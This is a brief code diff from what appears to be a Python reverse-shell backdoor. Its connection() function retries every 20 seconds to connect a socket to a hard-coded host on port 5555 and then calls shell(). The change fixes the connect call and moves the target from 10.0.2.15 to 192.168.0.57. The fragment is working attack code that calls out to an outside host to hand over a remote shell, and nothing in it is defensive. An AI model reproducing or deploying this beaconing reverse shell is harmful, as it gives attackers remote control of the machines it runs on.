@@ -24,7 +24,7 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            sock.connect("10.0.2.15", 5555)
+            sock.connect(("192.168.0.57", 5555))
             shell()
             sock.close()
             break
